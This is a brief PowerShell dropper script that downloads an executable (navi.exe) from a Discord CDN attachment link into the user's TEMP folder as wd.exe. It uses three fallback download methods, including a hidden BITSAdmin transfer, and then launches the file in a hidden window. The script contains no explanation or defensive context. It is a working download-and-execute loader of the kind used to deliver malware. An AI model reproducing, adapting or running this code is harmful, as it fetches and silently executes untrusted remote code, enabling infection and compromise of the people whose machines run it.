# PowerShell script to download and execute wd.exe

# Define variables
$url = "https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a675730&is=6a6605b0&hm=78269418c568d8a15e7c36ffb4929435a51b8278adf527d616de6c5a8793d07d&"
$temp = $env:TEMP
$output = "$temp\wd.exe"

# Download the file using multiple methods (for reliability)
try {
    # Method 1: WebClient
    (New-Object System.Net.WebClient).DownloadFile($url, $output)
} catch {
    try {
        # Method 2: Invoke-WebRequest (PowerShell 3.0+)
        Invoke-WebRequest -Uri $url -OutFile $output
    } catch {
        # Method 3: BITSAdmin (fallback)
        Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer d /download /priority high `"$url`" `"$output`""
    }
}

# Check if file exists and execute it
if (Test-Path $output) {
    Start-Process -WindowStyle Hidden -FilePath $output
}
